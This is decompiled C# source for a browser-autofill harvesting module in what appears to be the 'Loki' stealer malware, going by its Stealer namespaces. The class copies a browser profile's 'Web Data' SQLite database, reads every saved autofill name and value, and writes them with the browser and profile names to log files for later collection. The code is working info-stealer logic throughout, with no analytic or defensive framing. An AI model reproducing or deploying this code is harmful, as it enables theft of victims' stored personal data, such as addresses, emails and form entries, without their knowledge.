using System;
using System.Collections.Generic;
using System.IO;
using loki.loki.Stealer.Cookies;
using mozila_passwords;

namespace loki.loki.Stealer.WebData
{
	// Token: 0x02000030 RID: 48
	internal class Get_Browser_Autofill
	{
		// Token: 0x0600017D RID: 381 RVA: 0x0000A4C8 File Offset: 0x000086C8
		public static void Get_Autofill(string profilePath, string browser_name, string profile_name)
		{
			try
			{
				Sqlite sqlite = new Sqlite(GetCookies.CreateTempCopy(Path.Combine(profilePath, "Web Data")));
				sqlite.ReadTable("autofill");
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					Get_Browser_Autofill.AutofillCount++;
					try
					{
						Get_Browser_Autofill.Autofill.Add(string.Concat(new string[]
						{
							"Name : ",
							sqlite.GetValue(i, "name").Trim(),
							Environment.NewLine,
							"Value : ",
							sqlite.GetValue(i, "value").Trim()
						}));
					}
					catch
					{
					}
				}
				foreach (string text in Get_Browser_Autofill.Autofill)
				{
					Get_Browser_Autofill.Autofill_List.Add(string.Concat(new string[]
					{
						"Browser : ",
						browser_name,
						Environment.NewLine,
						"Profile : ",
						profile_name,
						Environment.NewLine,
						text,
						Environment.NewLine
					}));
				}
				Get_Browser_Autofill.Autofill.Clear();
			}
			catch
			{
			}
		}

		// Token: 0x0600017E RID: 382 RVA: 0x0000A640 File Offset: 0x00008840
		public static void Write_Autofill(string Browser_Name, string Profile_Name)
		{
			using (StreamWriter streamWriter = new StreamWriter(string.Concat(new string[]
			{
				Program.dir,
				"\\Browsers\\",
				Profile_Name,
				"_",
				Browser_Name,
				"_Autofill.log"
			})))
			{
				foreach (string value in Get_Browser_Autofill.Autofill_List)
				{
					streamWriter.Write(value);
					streamWriter.Write(Environment.NewLine);
				}
			}
		}

		// Token: 0x0400006E RID: 110
		public static List<string> Autofill_List = new List<string>();

		// Token: 0x0400006F RID: 111
		public static List<string> Autofill = new List<string>();

		// Token: 0x04000070 RID: 112
		public static int AutofillCount;
	}
}
